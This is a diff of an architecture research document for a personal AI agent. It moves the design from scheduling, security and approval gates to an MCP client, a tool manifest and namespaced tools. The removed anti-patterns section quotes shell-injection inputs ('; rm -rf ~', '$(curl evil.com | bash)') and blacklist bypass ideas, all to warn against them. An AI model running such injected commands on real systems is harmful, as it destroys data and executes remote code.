@@ -1,463 +1,596 @@
 # Architecture Research
 
-**Domain:** Personal AI agent — tool execution, scheduling, security, supervision
-**Researched:** 2026-03-18
-**Confidence:** HIGH (based on direct codebase inspection + verified patterns)
+**Domain:** Personal AI agent — MCP client integration, tool manifest, hybrid tool approach
+**Researched:** 2026-03-19
+**Confidence:** HIGH (direct codebase inspection + verified against @modelcontextprotocol/sdk v1.27.1 official docs)
 
-## Standard Architecture
+---
 
-### System Overview
+## Context
 
-The existing architecture is a clean layered monolith running in a single Node.js process supervised by a parent process. New capabilities (web search/scraping, code execution, scheduling, human approval) extend this structure without breaking boundaries.
+This document covers only the v1.1 milestone additions: MCP client support, tool manifest, and the hybrid tool approach. It builds on the existing v1.0 architecture documented in the prior ARCHITECTURE.md research. Existing components (channels, agent loop, LLM layer, memory, security, scheduler) are not re-architected here — only integration points and new components are described.
+
+---
+
+## System Overview
+
+### Where MCP Client Sits in the Layer Stack
+
+MCP client is a **peer to built-in tools at the tools layer**, not a separate layer. It connects to external processes (MCP servers) and adapts their tools into the same `Tool` interface the registry already uses. The tool manifest sits at the **initialization layer** in `index.ts`, governing which tools (built-in and MCP) are registered before the agent starts.
 
 ```
-┌────────────────────────────────────────────────────────────────┐
-│                        SUPERVISOR PROCESS                       │
-│  src/supervisor.ts — spawns + monitors the bot process         │
-│  Handles: crash recovery, git pull on update, exit code routing │
-│  New: heartbeat detection, periodic git polling, crash logs     │
-├────────────────────────────────────────────────────────────────┤
-│                          BOT PROCESS                            │
-├─────────────────────────────────┬──────────────────────────────┤
-│           CHANNEL LAYER         │       SCHEDULER LAYER         │
-│  src/channels/telegram.ts       │  src/scheduler/               │
-│  - inbound messages             │  - cron jobs (node-cron)      │
-│  - approval callbacks (new)     │  - task definitions           │
-│  - broadcast for proactive msgs │  - runs agent autonomously    │
-│         ↓                       │         ↓                     │
-├─────────────────────────────────┴──────────────────────────────┤
-│                          AGENT LAYER                            │
-│  src/agent/agent.ts — LLM ↔ tool loop                          │
-│  src/agent/context-builder.ts — system prompt assembly         │
-├──────────────────────────────────────────┬─────────────────────┤
-│           SECURITY LAYER (new)           │     LLM LAYER        │
-│  src/security/                           │  src/llm/            │
-│  - command blacklist                     │  - openrouter.ts     │
-│  - permission registry per tool          │  - model-router.ts   │
-│  - approval gate (pause/resume)          │                      │
-├──────────────────────────────────────────┴─────────────────────┤
-│                          TOOLS LAYER                            │
-│  src/tools/tool-registry.ts — register + execute               │
-│  src/tools/built-in/                                            │
-│    Existing: memory, time, GWS, Bitbucket, restart             │
-│    New: web-search, web-scrape, shell-exec, schedule-task       │
-├────────────────────────────────────────────────────────────────┤
-│                          MEMORY LAYER                           │
-│  src/memory/db.ts — SQLite WAL + FTS5                          │
-│  src/memory/memory-manager.ts — memories, sessions             │
-│  New table: scheduled_tasks (id, cron, prompt, enabled)        │
-│  New table: execution_log (id, tool, args, result, timestamp)  │
-└────────────────────────────────────────────────────────────────┘
+┌────────────────────────────────────────────────────────────────────┐
+│                        SUPERVISOR PROCESS                           │
+│  src/supervisor.ts — crash recovery, hang detection, auto-update   │
+├────────────────────────────────────────────────────────────────────┤
+│                          BOT PROCESS                                │
+├──────────────────────────────────┬─────────────────────────────────┤
+│         CHANNEL LAYER            │       SCHEDULER LAYER            │
+│  src/channels/telegram.ts        │  src/scheduler/                  │
+│                                  │  (unchanged — runs runAgent())   │
+│         ↓                        │         ↓                        │
+├──────────────────────────────────┴─────────────────────────────────┤
+│                          AGENT LAYER                                │
+│  src/agent/agent.ts — LLM ↔ tool loop (unchanged interface)        │
+│  src/agent/context-builder.ts — system prompt assembly             │
+├──────────────────────────────────┬─────────────────────────────────┤
+│       SECURITY LAYER             │         LLM LAYER                │
+│  src/security/                   │  src/llm/                        │
+│  (unchanged)                     │  (unchanged)                     │
+├──────────────────────────────────┴─────────────────────────────────┤
+│                          TOOLS LAYER                                │
+│  src/tools/tool-manifest.ts   ← NEW: declares what to load         │
+│  src/tools/tool-registry.ts   ← UNCHANGED: register + execute      │
+│                                                                     │
+│  src/tools/built-in/          ← UNCHANGED: existing custom tools   │
+│    get-current-time, save-memory, web-search, execute-command...   │
+│                                                                     │
+│  src/mcp/                     ← NEW: MCP client subsystem          │
+│    mcp-client.ts              ← connects to one MCP server         │
+│    mcp-manager.ts             ← manages all MCP clients            │
+│    mcp-tool-adapter.ts        ← wraps MCP tools as Tool interface  │
+├────────────────────────────────────────────────────────────────────┤
+│                          MEMORY LAYER                               │
+│  src/memory/db.ts — SQLite WAL + FTS5 (unchanged)                  │
+└────────────────────────────────────────────────────────────────────┘
+│                       EXTERNAL PROCESSES                            │
+│  [MCP Server A: stdio]  [MCP Server B: stdio]  [MCP Server C: ...]  │
+│  Each is a separate child process managed by mcp-manager.ts        │
+└────────────────────────────────────────────────────────────────────┘
 ```
 
-### Component Responsibilities
+**Critical constraint:** `agent.ts` and `tool-registry.ts` do not change. The agent loop calls `toolRegistry.getDefinitions()` and `toolRegistry.execute()` exactly as before — MCP tools are registered into the same registry as built-in tools. The agent never knows whether a tool is custom or MCP-sourced.
 
-| Component | Responsibility | Communicates With |
-|-----------|----------------|-------------------|
-| `supervisor.ts` | Process lifecycle, crash recovery, git updates, hang detection | OS (child_process), bot process via exit codes |
-| `channels/telegram.ts` | Inbound messages, outbound replies, approval callbacks, broadcast | Agent layer, Security approval gate |
-| `agent/agent.ts` | LLM ↔ tool iteration loop, session history, model routing | LLM layer, Tool registry, Memory manager |
-| `security/` (new) | Command blacklist, per-tool permissions, human approval pause/resume | Tool registry (wraps execute), Telegram channel |
-| `scheduler/` (new) | Cron job management, fires agent runs on schedule | Agent layer, Memory (scheduled_tasks table), Telegram broadcast |
-| `tools/built-in/web-search.ts` (new) | HTTP search API calls, return ranked results | LLM via tool result |
-| `tools/built-in/web-scrape.ts` (new) | Fetch + parse HTML via Cheerio, return text content | LLM via tool result |
-| `tools/built-in/shell-exec.ts` (new) | Execute commands via child_process.spawn (not shell), filtered by blacklist | Security layer, returns stdout/stderr |
-| `tools/built-in/schedule-task.ts` (new) | CRUD on scheduled_tasks table | Memory layer (SQLite) |
-| `memory/db.ts` | SQLite schema + migrations, WAL mode | All layers that need persistence |
-| `llm/openrouter.ts` | API calls to OpenRouter with tier selection | Agent loop |
+---
 
-## Recommended Project Structure
+## New Components Required
+
+| Component | File | What It Does | Depends On |
+|-----------|------|-------------|-----------|
+| Tool manifest | `src/tools/tool-manifest.ts` | Declares which custom tools and MCP servers to load, with enabled flags | Nothing (pure config) |
+| MCP client | `src/mcp/mcp-client.ts` | Wraps `@modelcontextprotocol/sdk` Client + StdioClientTransport for one server | `@modelcontextprotocol/sdk` |
+| MCP manager | `src/mcp/mcp-manager.ts` | Starts all enabled MCP servers, collects their tools, owns lifecycle | `mcp-client.ts` |
+| MCP tool adapter | `src/mcp/mcp-tool-adapter.ts` | Converts an MCP tool definition + callTool into a `Tool` object | `tool-types.ts`, `mcp-client.ts` |
+
+### Modified Components
+
+| Component | File | Change |
+|-----------|------|--------|
+| `index.ts` | `src/index.ts` | Add manifest loading + MCP manager startup; register adapted tools into existing registry |
+| `config.ts` | `src/config.ts` | Add `MCP_MANIFEST_PATH` env var (optional, default `./tools.manifest.json`) |
+| Graceful shutdown | `src/index.ts` shutdown block | Add `mcpManager.disconnectAll()` before `db.close()` |
+
+---
+
+## Tool Manifest Design
+
+### File Format
+
+```jsonc
+// tools.manifest.json
+{
+  "customTools": {
+    "get_current_time": { "enabled": true },
+    "save_memory": { "enabled": true },
+    "search_memories": { "enabled": true },
+    "web_search": { "enabled": true },
+    "web_scrape": { "enabled": true },
+    "execute_command": { "enabled": true },
+    "google_drive": { "enabled": false },
+    "google_gmail": { "enabled": false },
+    "google_calendar": { "enabled": false },
+    "google_sheets": { "enabled": false },
+    "bitbucket_prs": { "enabled": false }
+  },
+  "mcpServers": [
+    {
+      "name": "filesystem",
+      "enabled": true,
+      "transport": "stdio",
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]
+    },
+    {
+      "name": "github",
+      "enabled": false,
+      "transport": "stdio",
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-github"],
+      "env": { "GITHUB_PERSONAL_ACCESS_TOKEN": "${GITHUB_TOKEN}" }
+    }
+  ]
+}
+```
+
+**Design decisions:**
+- JSON (not YAML) — already parse-able with `JSON.parse`, no new dependency
+- `enabled` flag per custom tool mirrors existing env-var feature flags in `index.ts` but consolidated
+- `enabled` flag per MCP server allows disabling without removing the config entry
+- `transport` defaults to `"stdio"` — only supported value for v1.1 (Streamable HTTP is out of scope)
+- `env` in MCP server config supports `${VAR}` substitution from `process.env` at load time
+- Custom tool section is optional — if absent, all custom tools follow existing env-var pattern
+
+### Manifest TypeScript Interface
+
+```typescript
+// src/tools/tool-manifest.ts
+export interface ToolManifest {
+  customTools?: Record<string, { enabled: boolean }>;
+  mcpServers?: McpServerConfig[];
+}
+
+export interface McpServerConfig {
+  name: string;
+  enabled: boolean;
+  transport: "stdio";
+  command: string;
+  args: string[];
+  env?: Record<string, string>;  // supports ${VAR} substitution
+}
+
+export function loadManifest(path: string): ToolManifest {
+  // Read JSON file; return empty manifest if file doesn't exist
+  // Substitute ${VAR} in env values from process.env
+}
+```
+
+**No YAML dependency.** JSON is sufficient and avoids adding `js-yaml` to the project.
+
+---
+
+## MCP Client Architecture
+
+### MCP SDK API Surface (verified against v1.27.1)
+
+```typescript
+import { Client } from "@modelcontextprotocol/sdk/client/index.js";
+import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
+
+// Create client
+const client = new Client({ name: "jarvis", version: "1.0.0" });
+
+// Connect to a stdio MCP server (spawns the server process)
+const transport = new StdioClientTransport({
+  command: "npx",
+  args: ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"],
+  env: { ...process.env, SOME_KEY: "value" }
+});
+await client.connect(transport);
+
+// List tools (returns Tool[] with name, description, inputSchema)
+const { tools } = await client.listTools();
+// tools[0]: { name: string, description: string, inputSchema: JsonSchema }
+
+// Call a tool
+const result = await client.callTool({ name: "read_file", arguments: { path: "/tmp/test.txt" } });
+// result.content: Array<{ type: "text", text: string } | { type: "image", ... }>
+
+// Disconnect
+await transport.close();
+```
+
+**Key schema mapping:** MCP tools use `inputSchema` (not `parameters`). The adapter maps `inputSchema` → `parameters` when creating `ToolDefinition` objects for the registry.
+
+**MCP `callTool` result format:** Returns `content` array where each item has a `type`. The most common type is `"text"` with a `text` field. The adapter flattens this into a `ToolResult` string for the LLM.
+
+### `mcp-client.ts` — Single Server Client
+
+```typescript
+// src/mcp/mcp-client.ts
+export class McpClient {
+  private client: Client;
+  private transport: StdioClientTransport | null = null;
+  private connected = false;
+
+  constructor(private config: McpServerConfig) {}
+
+  async connect(): Promise<void>
+  async listTools(): Promise<McpToolDefinition[]>
+  async callTool(name: string, args: Record<string, unknown>): Promise<ToolResult>
+  async disconnect(): Promise<void>
+  isConnected(): boolean
+}
+```
+
+**No reconnect logic in v1.1.** If a server dies, the next `callTool` fails with a clear error. The LLM receives the error as a tool result and responds accordingly. Auto-reconnect adds complexity (re-initialize protocol handshake) and edge cases that are not worth solving for personal use. See PITFALLS.md for the SSE reconnect bug context — stdio is simpler but still requires a fresh `connect()` to re-initialize.
+
+### `mcp-manager.ts` — Multi-Server Lifecycle
+
+```typescript
+// src/mcp/mcp-manager.ts
+export class McpManager {
+  private clients = new Map<string, McpClient>();
+
+  // Called once at startup: connect all enabled servers, collect tools
+  async startAll(servers: McpServerConfig[]): Promise<McpToolDefinition[]>
+
+  // Execute a tool on the appropriate server (routes by serverName prefix)
+  async callTool(serverName: string, toolName: string, args: Record<string, unknown>): Promise<ToolResult>
+
+  // Called at shutdown: disconnect all servers
+  async disconnectAll(): Promise<void>
+}
+```
+
+**Tool name namespacing:** MCP tool names are registered as `{serverName}__{toolName}` (double underscore separator) to prevent name collisions between servers and with built-in tools. The adapter strips the prefix when routing to the right `McpClient`.
+
+Example: a filesystem server tool `read_file` becomes `filesystem__read_file` in the registry. The LLM sees this name in the tool definition and uses it. The adapter splits on `__` to route the call.
+
+### `mcp-tool-adapter.ts` — Interface Bridge
+
+```typescript
+// src/mcp/mcp-tool-adapter.ts
+
+// Converts an MCP tool + client reference into a Tool object
+// that tool-registry.ts can register
+export function adaptMcpTool(
+  serverName: string,
+  mcpTool: McpToolDefinition,
+  manager: McpManager
+): Tool {
+  return {
+    definition: {
+      name: `${serverName}__${mcpTool.name}`,
+      description: mcpTool.description ?? mcpTool.name,
+      parameters: mcpTool.inputSchema as JsonSchema,  // MCP inputSchema matches ToolDefinition.parameters shape
+    },
+    async execute(args, _context) {
+      return manager.callTool(serverName, mcpTool.name, args);
+    }
+  };
+}
+```
+
+**Schema compatibility:** The existing `JsonSchema` type in `tool-types.ts` uses `type: "object"` with `properties`. MCP `inputSchema` follows the same JSON Schema object structure. The cast is safe for standard MCP servers; exotic schema types (arrays of top-level params) would need explicit handling but are uncommon in practice.
+
+---
+
+## Initialization Flow (index.ts changes)
+
+```
+main() starts
+    ↓
+1. initDatabase(), loadSoul() — unchanged
+    ↓
+2. loadManifest(config.paths.manifest)  ← NEW
+    ↓
+3. new ToolRegistry()                   ← unchanged
+    ↓
+4. Register built-in tools              ← driven by manifest.customTools OR
+   (manifest present: use manifest)       existing env-var flags if no manifest
+   (no manifest: existing behavior)
+    ↓
+5. new McpManager()                     ← NEW
+   await mcpManager.startAll(manifest.mcpServers.filter(s => s.enabled))
+    ↓ for each MCP server:
+   McpClient.connect() → StdioClientTransport spawns server process
+   client.listTools() → get tool list
+   adaptMcpTool() for each → create Tool object
+   toolRegistry.register(adaptedTool)  ← same registry, same interface
+    ↓
+6. new OpenRouterProvider()             ← unchanged
+7. new TelegramChannel()                ← unchanged
+8. startScheduler()                     ← unchanged (now has MCP tools too)
+    ↓
+Graceful shutdown adds: mcpManager.disconnectAll()
+```
+
+**Startup order:** MCP servers must connect before the Telegram channel starts. If a server fails to connect, log a warning and continue — Jarvis starts without that server's tools rather than refusing to start entirely. This is the correct behavior for personal use: a server being down should not prevent Jarvis from running.
+
+---
+
+## Recommended Project Structure (additions only)
 
 ```
 src/
-├── index.ts                    # Entry point — wires everything, starts scheduler
-├── config.ts                   # Env config + new scheduler/security settings
-├── types.ts                    # Shared types
-├── exit-codes.ts               # Exit code constants
-├── restart-signal.ts           # Pending restart signaling
-├── supervisor.ts               # Supervisor process (separate entrypoint)
-├── logger.ts                   # Structured logging
+├── index.ts                    # Modified: manifest loading, MCP manager init
+├── config.ts                   # Modified: add MCP_MANIFEST_PATH
 │
-├── agent/
-│   ├── agent.ts                # LLM ↔ tool loop (unchanged interface)
-│   └── context-builder.ts      # System prompt assembly
-│
-├── channels/
-│   ├── channel.ts              # Channel interface
-│   └── telegram.ts             # Grammy implementation + approval callbacks
-│
-├── llm/
-│   ├── llm-provider.ts         # Interface
-│   ├── openrouter.ts           # Implementation
-│   └── model-router.ts         # Complexity classification
-│
-├── memory/
-│   ├── db.ts                   # SQLite init + schema migrations
-│   │                           # New tables: scheduled_tasks, execution_log
-│   ├── memory-manager.ts       # Existing memory API
-│   └── soul.ts                 # Personality file loader
-│
-├── security/                   # NEW module
-│   ├── command-blacklist.ts    # Blocked command patterns (array + test fn)
-│   ├── tool-permissions.ts     # Per-tool risk level + allowed actions
-│   └── approval-gate.ts        # Pause execution, send Telegram prompt, await response
-│
-├── scheduler/                  # NEW module
-│   ├── scheduler.ts            # node-cron scheduler, load tasks from DB
-│   ├── task-runner.ts          # Runs runAgent() for scheduled tasks
-│   └── task-types.ts           # ScheduledTask interface
+├── mcp/                        # NEW module
+│   ├── mcp-client.ts           # Single server client (wraps @modelcontextprotocol/sdk)
+│   ├── mcp-manager.ts          # Multi-server lifecycle manager
+│   └── mcp-tool-adapter.ts     # Converts MCP tool → Tool interface
 │
 └── tools/
-    ├── tool-types.ts           # Tool interface + ToolContext (add riskLevel)
-    ├── tool-registry.ts        # Registry (wrap execute with security check)
-    └── built-in/
-        ├── get-current-time.ts
-        ├── save-memory.ts
-        ├── search-memories.ts
-        ├── propose-tool.ts
-        ├── table-image.ts
-        ├── restart-server.ts
-        ├── gws-drive.ts
-        ├── gws-gmail.ts
-        ├── gws-calendar.ts
-        ├── gws-sheets.ts
-        ├── bitbucket-prs.ts
-        ├── web-search.ts       # NEW — search API (Brave/Serper/DuckDuckGo)
-        ├── web-scrape.ts       # NEW — Cheerio HTML fetch+parse
-        ├── shell-exec.ts       # NEW — spawn child process, blacklist check
-        └── schedule-task.ts    # NEW — CRUD for scheduled_tasks table
+    ├── tool-manifest.ts        # NEW: manifest schema, loader, env substitution
+    ├── tool-types.ts           # UNCHANGED
+    ├── tool-registry.ts        # UNCHANGED
+    └── built-in/               # UNCHANGED: existing tools
+        └── ...
 ```
 
-### Structure Rationale
+```
+# New config file at project root
+tools.manifest.json             # User-managed tool configuration
+```
 
-- **security/:** Isolated module so security logic is never scattered across tools. Approval gate lives here, not in individual tools. This makes auditing and changes centralized.
-- **scheduler/:** Separate from channels because it is not user-initiated; it initiates agent runs autonomously. Keeps the channel layer's single responsibility intact.
-- **tools/built-in/:** All tools stay flat here per existing convention — avoids creating sub-categories that add import complexity.
+---
 
 ## Architectural Patterns
 
-### Pattern 1: Security Middleware at Registry Boundary
+### Pattern 1: Registry-Transparent MCP Integration
 
-**What:** `ToolRegistry.execute()` becomes the single enforcement point for all security checks. Before calling `tool.execute()`, the registry checks tool permissions, runs the blacklist if it is a shell tool, and invokes the approval gate for high-risk actions.
+**What:** MCP tools register into the same `ToolRegistry` as built-in tools via the `Tool` interface adapter. The agent loop, the LLM call, and `getDefinitions()` all see a flat list of tools with no type distinction.
 
-**When to use:** Any time a new dangerous capability is added — the tool author does not implement its own security; the registry enforces it uniformly.
+**When to use:** This is the only correct approach given the existing architecture. Any design that requires `agent.ts` or `tool-registry.ts` to know about MCP breaks the single-responsibility boundaries of those modules.
 
-**Trade-offs:** Centralizes security logic but requires the registry to know about tool risk levels. Solved by adding a `riskLevel` field to `ToolDefinition`.
+**Trade-offs:** All tools look identical to the agent — correct for behavior. Debugging is slightly harder (a failed MCP tool call looks like a failed built-in tool call). Mitigate with structured logging in the adapter that includes `serverName`.
 
-**Example:**
-```typescript
-// tool-types.ts
-export interface ToolDefinition {
-  name: string;
-  description: string;
-  parameters: JsonSchema;
-  riskLevel?: "low" | "medium" | "high"; // new field
-}
+### Pattern 2: Manifest as Single Source of Truth for Tool Loading
 
-// tool-registry.ts — execute wraps with security
-async execute(name, args, context): Promise<ToolResult> {
-  const tool = this.tools.get(name);
-  if (!tool) return { success: false, data: null, error: `Unknown tool: ${name}` };
+**What:** `tools.manifest.json` declares everything that gets registered at startup. Built-in tools with `enabled: false` are skipped. MCP servers that are disabled are not connected. The manifest replaces the scattered `if (config.google.enabled.drive)` blocks in `index.ts`.
 
-  // High-risk: require human approval before execution
-  if (tool.definition.riskLevel === "high") {
-    const approved = await approvalGate.request(context, tool.definition.name, args);
-    if (!approved) return { success: false, data: null, error: "User denied execution" };
-  }
+**When to use:** Once the manifest file exists. Backward compatibility: if no manifest file is present, existing env-var behavior is unchanged.
 
-  try {
-    return await tool.execute(args, context);
-  } catch (err) {
-    return { success: false, data: null, error: `Tool error: ${(err as Error).message}` };
-  }
-}
-```
-
-### Pattern 2: Approval Gate as Async Pause/Resume
-
-**What:** When a high-risk action is requested, the agent loop pauses mid-execution by awaiting a Promise that only resolves when the user responds via Telegram. The approval gate maps a pending request ID to a resolve/reject function stored in memory.
-
-**When to use:** Any tool marked `riskLevel: "high"` — shell execution, file deletion, external sends (email, calendar events).
-
-**Trade-offs:** Simple to implement with a Map of pending promises. Risk: if the bot restarts while an approval is pending, the promise is lost. For personal use this is acceptable — the agent will report failure and the user retries.
+**Trade-offs:** Adds one more file to manage. Benefit: enables/disables tools without restarting and without changing env vars. Configuration is explicit and auditable in one place.
 
 **Example:**
 ```typescript
-// security/approval-gate.ts
-const pending = new Map<string, (approved: boolean) => void>();
+// index.ts — after manifest is loaded
+const manifest = loadManifest(config.paths.manifest);
 
-export async function requestApproval(
-  notify: (msg: string) => Promise<void>,
-  toolName: string,
-  args: Record<string, unknown>
-): Promise<boolean> {
-  const id = randomUUID();
-  await notify(`Jarvis quiere ejecutar \`${toolName}\`:\n\`\`\`json\n${JSON.stringify(args, null, 2)}\n\`\`\`\nResponde /approve_${id} o /deny_${id}`);
-  return new Promise((resolve) => {
-    pending.set(id, resolve);
-    setTimeout(() => {
-      if (pending.has(id)) {
-        pending.delete(id);
-        resolve(false); // timeout → auto-deny
-      }
-    }, 120_000); // 2 min timeout
-  });
-}
-
-export function handleApprovalResponse(id: string, approved: boolean): void {
-  const resolver = pending.get(id);
-  if (resolver) {
-    pending.delete(id);
-    resolver(approved);
-  }
+// Custom tools driven by manifest
+if (manifest.customTools?.google_drive?.enabled ?? config.google.enabled.drive) {
+  toolRegistry.register(gwsDriveTool);
 }
 ```
 
-### Pattern 3: Scheduler as Agent Initiator
+### Pattern 3: Namespace-Prefixed MCP Tool Names
 
-**What:** The scheduler loads cron tasks from the `scheduled_tasks` SQLite table on startup, schedules them with `node-cron`, and fires `runAgent()` with a synthetic context when they trigger. Results are broadcast via Telegram.
+**What:** All MCP tools are registered as `{serverName}__{toolName}`. The double underscore is unlikely to appear in either part naturally.
 
-**When to use:** Any time Jarvis needs to take action without user input — morning summaries, PR monitoring, reminders.
+**When to use:** Always, for all MCP tools.
 
-**Trade-offs:** Running inside the bot process means scheduled tasks share the same event loop. For a personal agent with low task frequency (a few per day), this is fine and simpler than a separate process. If task volume grows, move to a worker thread.
+**Trade-offs:** Makes tool names longer in LLM prompts. But prevents collisions (two MCP servers could both expose a `read_file` tool) and makes it immediately clear in logs which server a tool belongs to.
 
 **Example:**
-```typescript
-// scheduler/task-runner.ts
-export async function runScheduledTask(
-  task: ScheduledTask,
-  deps: { llm, toolRegistry, memoryManager, soulContent, telegram }
-): Promise<void> {
-  const sessionId = deps.memoryManager.resolveSession(
-    "scheduler", "scheduled", 0  // always new session
-  );
-  const result = await runAgent(
-    {
-      userId: "scheduler",
-      userName: "Scheduler",
-      channelId: "scheduled",
-      sessionId,
-      userMessage: task.prompt,
-    },
-    deps.llm, deps.toolRegistry, deps.memoryManager, deps.soulContent, 10
-  );
-  await deps.telegram.broadcast(result.text);
-}
+```
+filesystem__read_file
+filesystem__write_file
+github__search_repositories
+github__create_issue
 ```
 
-### Pattern 4: Shell Execution via spawn (Not exec/execSync)
+### Pattern 4: Fail-Open MCP Server Connection
 
-**What:** Use `child_process.spawn()` with arguments as an array (not a shell string) plus a blacklist check before invocation. Never use `exec()` or `execSync()` with user-supplied strings — shell interpretation enables injection.
+**What:** If an MCP server fails to connect at startup, log the error and continue. Jarvis starts without that server's tools. If a `callTool` on a disconnected server is attempted at runtime, the adapter returns `{ success: false, error: "MCP server 'X' is not connected" }` — the LLM receives this as a tool result and can inform the user.
 
-**When to use:** Every time the `shell_exec` tool runs a command.
+**When to use:** Always. Failing hard on MCP server unavailability would make Jarvis unreliable if an external server is temporarily down.
 
-**Trade-offs:** `spawn` without `shell: true` cannot use shell features (pipes, redirects, globs). This is the point — it prevents injection. For legitimate pipeline needs, the tool must explicitly compose operations.
+**Trade-offs:** The LLM may attempt to call a tool from an unavailable server and get an error. This is better than Jarvis not starting at all.
 
-**Example:**
-```typescript
-// tools/built-in/shell-exec.ts
-import { spawn } from "node:child_process";
-import { isCommandBlocked } from "../../security/command-blacklist.js";
+### Pattern 5: Stdio-Only Transport for v1.1
 
-// args.command is the executable, args.args is string[]
-if (isCommandBlocked(args.command as string)) {
-  return { success: false, data: null, error: "Command blocked by security policy" };
-}
+**What:** Only `StdioClientTransport` is supported. Streamable HTTP (the new remote transport) is deferred.
 
-const child = spawn(args.command as string, args.args as string[], {
-  shell: false,     // NEVER true
-  timeout: 30_000,  // hard cap
-  cwd: process.env.HOME, // restrict working directory
-});
-```
+**When to use:** All MCP server configs in v1.1.
+
+**Rationale:** Stdio is the correct transport for local MCP servers on macOS. It spawns the server as a child process, communicates over stdin/stdout, and cleans up automatically when the client disconnects. Streamable HTTP adds auth, network config, and session management complexity that is out of scope for this milestone. The standalone SSE transport is deprecated as of MCP spec v2025-03-26 and should not be implemented.
+
+---
 
 ## Data Flow
 
-### User Message Flow (existing + security layer)
+### MCP Tool Call Flow (at runtime)
 
 ```
-Telegram message arrives
+Agent loop calls toolRegistry.execute("filesystem__read_file", {path: "/tmp/x"}, ctx)
     ↓
-TelegramChannel.handleIncoming()
-    ↓ (allowed user check)
-runAgent() called
+ToolRegistry looks up tool by name
     ↓
-buildSystemPrompt() + load session history
+Finds the adapted McpTool object (execute function is the adapter closure)
     ↓
-LLM.chat() → response
-    ↓ (if tool_calls present)
-ToolRegistry.execute()
+adapter.execute(args, ctx) is called
     ↓
-  [security check: riskLevel?]
-    ├── low/medium → tool.execute() immediately
-    └── high → approvalGate.request()
-              ↓
-          Telegram sends approval prompt to user
-              ↓
-          User responds /approve_<id> or /deny_<id>
-              ↓
-          Promise resolves
-              ↓
-          tool.execute() (if approved) or error (if denied)
+McpManager.callTool("filesystem", "read_file", args)
     ↓
-Tool result added to message history
+McpClient for "filesystem" calls client.callTool({ name: "read_file", arguments: args })
     ↓
-Loop back to LLM.chat()
-    ↓ (no more tool_calls)
-Final text returned to TelegramChannel
+@modelcontextprotocol/sdk sends JSON-RPC to the MCP server process via stdin
     ↓
-ctx.reply() to user
+MCP server process reads from stdin, executes, writes result to stdout
+    ↓
+SDK receives JSON-RPC response, returns result.content array
+    ↓
+Adapter flattens content array → ToolResult { success: true, data: "file contents..." }
+    ↓
+ToolRegistry returns ToolResult to agent loop
+    ↓
+Agent loop adds tool result to messages, loops back to LLM
 ```
 
-### Scheduler Flow (new)
+### Startup Initialization Flow
 
 ```
-node-cron fires at cron time
+loadManifest() reads tools.manifest.json
     ↓
-scheduler/task-runner.ts
+McpManager.startAll() iterates enabled MCP servers
     ↓
-Reads task prompt from scheduled_tasks (SQLite)
+  for each server:
+  McpClient.connect()
+      ↓
+  StdioClientTransport spawns server process (e.g., npx -y @mcp/server-filesystem)
+      ↓
+  SDK performs initialize handshake over stdin/stdout
+      ↓
+  client.listTools() → [{ name, description, inputSchema }, ...]
+      ↓
+  adaptMcpTool() wraps each into Tool interface
+      ↓
+  toolRegistry.register(adaptedTool)
     ↓
-runAgent() with synthetic context (userId="scheduler")
+All tools (built-in + MCP) now in registry
     ↓
-Agent loop executes — may use any registered tool
-    ↓
-telegram.broadcast(result.text)
-    ↓
-User receives proactive message
+Telegram channel starts → agent is ready
 ```
 
-### Supervisor Enhanced Flow (new)
+### Graceful Shutdown Flow (MCP addition)
 
 ```
-supervisor.ts starts bot process
+SIGTERM / SIGINT received
     ↓
-Writes heartbeat timestamp file every N seconds (new)
+[existing: stop heartbeat, broadcast, stop scheduler, drain in-flight agents]
     ↓
-Supervisor polls heartbeat file
-    ├── heartbeat current → healthy
-    └── heartbeat stale > threshold → SIGKILL + restart (hang detection)
+mcpManager.disconnectAll()          ← NEW: before db.close()
     ↓
-Periodic git poll (new) every interval
-    ├── no new commits → do nothing
-    └── new commits → EXIT_UPDATE → git pull + restart
+  for each McpClient:
+  transport.close()                 ← sends SIGTERM to MCP server child process
     ↓
-All restarts appended to logs/crashes.jsonl (new)
+db.close()
+    ↓
+process.exit()
 ```
 
-### Key Data Flows
-
-1. **Approval gate interrupt:** Agent loop awaits a Promise stored in `approvalGate.pending` Map. Telegram command handler calls `handleApprovalResponse()` which resolves the Promise. The Map is the only coupling between the two.
-
-2. **Scheduled task to agent:** Scheduler reads from `scheduled_tasks` table → creates synthetic `AgentContext` → passes to same `runAgent()` function used for normal messages. No special agent code path needed.
-
-3. **Shell execution:** `shell-exec` tool receives `{command, args[]}` → blacklist check in `security/command-blacklist.ts` → `spawn()` with `shell: false` → stdout/stderr captured → returned as `ToolResult`.
-
-## Scaling Considerations
-
-This is a single-user personal agent on macOS. Scaling is not a concern. Architecture choices should optimize for simplicity and debuggability, not throughput.
-
-| Concern | At current scale (1 user) | If ever changed |
-|---------|---------------------------|-----------------|
-| Concurrency | Single message handled at a time; Telegram serializes user messages | Add message queue if parallel users needed |
-| Scheduled task load | In-process with node-cron, shares event loop | Move to worker_threads if tasks are CPU-bound |
-| SQLite contention | WAL mode handles concurrent reads fine | Switch to Postgres if remote access needed |
-| Supervisor | Custom supervisor is sufficient | Replace with PM2 if monitoring UI needed |
-
-## Anti-Patterns
-
-### Anti-Pattern 1: exec() / execSync() with Shell Interpretation
-
-**What people do:** `exec(\`git pull ${userInput}\`)` or `execSync(commandString)` — passes a single string to the shell for interpretation.
-
-**Why it's wrong:** Shell metacharacters in the input (`; rm -rf ~`, `$(curl evil.com | bash)`) execute arbitrary commands. CVE-2025-53372 is a real 2025 example of this exact mistake in an AI agent MCP server.
-
-**Do this instead:** `spawn(executable, argsArray, { shell: false })`. Validate the executable against a whitelist. Pass arguments as separate array elements.
-
-### Anti-Pattern 2: Blacklist-Only Security for Code Execution
-
-**What people do:** Block strings like `rm`, `sudo`, `curl` with regex before passing to shell.
-
-**Why it's wrong:** Blacklists are trivially bypassed via string concatenation, aliasing, or encoding (`r\m`, `base64 decode`, script wrappers). The 2025 n8n sandbox escape (CVE-2025-68613) exploited exactly this class of bypasses.
-
-**Do this instead:** Whitelist approach for command names + `shell: false` spawn + human approval gate for all shell execution. Defense in depth: all three layers must independently stop an attack.
-
-### Anti-Pattern 3: Scheduler as Separate Process
-
-**What people do:** Spawn a separate cron process that calls the bot via HTTP or IPC.
-
